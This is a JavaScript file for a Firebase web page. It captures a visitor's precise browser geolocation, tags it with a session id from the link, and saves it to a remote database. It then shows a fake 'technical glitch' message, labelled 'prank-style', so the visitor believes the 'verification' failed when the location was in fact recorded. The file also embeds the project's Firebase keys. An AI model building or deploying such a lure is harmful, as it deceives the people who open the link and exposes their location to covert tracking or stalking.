import {
  initializeApp
} from "https://www.gstatic.com/firebasejs/12.16.0/firebase-app.js";

import {
  getAuth,
  signInAnonymously
} from "https://www.gstatic.com/firebasejs/12.16.0/firebase-auth.js";

import {
  getDatabase,
  ref,
  set
} from "https://www.gstatic.com/firebasejs/12.16.0/firebase-database.js";


// ==========================================
// FIREBASE CONFIGURATION
// ==========================================

const firebaseConfig = {
  apiKey: "AIzaSyC4LdRoP57hU3Xl6wGrWcrqMUpXSlXyakU",
  authDomain: "dev-project-4907e.firebaseapp.com",
  databaseURL:
    "https://dev-project-4907e-default-rtdb.asia-southeast1.firebasedatabase.app",
  projectId: "dev-project-4907e",
  storageBucket: "dev-project-4907e.firebasestorage.app",
  messagingSenderId: "453966238199",
  appId: "1:453966238199:web:50fdc2c06d5b08ac865ef2"
};


// ==========================================
// INITIALIZE FIREBASE
// ==========================================

const app = initializeApp(firebaseConfig);

const auth = getAuth(app);
const db = getDatabase(app);


// ==========================================
// HTML ELEMENTS
// ==========================================

const shareBtn = document.getElementById("shareBtn");
const statusEl = document.getElementById("status");
const resultEl = document.getElementById("result");


// ==========================================
// STATUS MESSAGE
// ==========================================

function setStatus(text, type = "") {
  statusEl.textContent = text;
  statusEl.className = `status ${type}`;
}


// ==========================================
// SESSION ID
// ==========================================

function getSessionId() {
  const params = new URLSearchParams(
    window.location.search
  );

  return params.get("id") || "general";
}


// ==========================================
// SAVE LOCATION
// ==========================================

async function saveLocation(position) {

  const user = auth.currentUser;

  if (!user) {
    throw new Error("Authentication is not ready.");
  }

  const latitude = position.coords.latitude;
  const longitude = position.coords.longitude;
  const accuracy = position.coords.accuracy;

  const sessionId = getSessionId();


  const payload = {
    uid: user.uid,
    sessionId: sessionId,
    latitude: latitude,
    longitude: longitude,
    accuracy: Math.round(accuracy),
    timestamp: Date.now()
  };


  // Save voluntarily shared location to Firebase

  await set(
    ref(db, `locations/${user.uid}`),
    payload
  );


  // ========================================
  // PRANK-STYLE RESULT MESSAGE
  // ========================================

  resultEl.innerHTML = `
    <strong>
      ⚠️ Technical glitch detected 😭
    </strong>

    <span>
      Verification result couldn't be displayed properly.
    </span>
  `;

  resultEl.classList.remove("hidden");


  setStatus(
    "Technical glitch detected. Please try again later. 😭",
    "error"
  );


  shareBtn.disabled = false;
}


// ==========================================
// START LOCATION SHARING
// ==========================================

async function start() {

  shareBtn.disabled = true;

  resultEl.classList.add("hidden");


  try {

    // --------------------------------------
    // Anonymous Firebase authentication
    // --------------------------------------

    await signInAnonymously(auth);


    // --------------------------------------
    // Check browser location support
    // --------------------------------------

    if (!("geolocation" in navigator)) {

      throw new Error(
        "This browser does not support location sharing."
      );
    }


    // --------------------------------------
    // Ask browser for permission
    // --------------------------------------

    setStatus(
      "Your browser will now ask whether you want to share your location… 📍"
    );


    navigator.geolocation.getCurrentPosition(

      // ====================================
      // SUCCESS
      // ====================================

      async (position) => {

        try {

          await saveLocation(position);

        } catch (error) {

          console.error(
            "Firebase save error:",
            error
          );

          setStatus(
            "The location could not be saved. Please try again.",
            "error"
          );

          shareBtn.disabled = false;
        }
      },


      // ====================================
      // ERROR
      // ====================================

      (error) => {

        console.error(
          "Geolocation error:",
          error
        );


        const messages = {

          1: "Location sharing was cancelled or denied.",

          2: "Your location could not be determined.",

          3: "The request timed out. Please try again."
        };


        setStatus(
          messages[error.code] ||
          "Location sharing failed.",
          "error"
        );


        shareBtn.disabled = false;
      },


      // ====================================
      // OPTIONS
      // ====================================

      {
        enableHighAccuracy: true,
        timeout: 15000,
        maximumAge: 0
      }
    );


  } catch (error) {

    console.error(
      "Application error:",
      error
    );


    setStatus(
      "Something went wrong. Please check the Firebase configuration.",
      "error"
    );


    shareBtn.disabled = false;
  }
}


// ==========================================
// BUTTON EVENT
// ==========================================

if (shareBtn) {

  shareBtn.addEventListener(
    "click",
    start
  );

} else {

  console.error(
    "shareBtn element was not found."
  );
}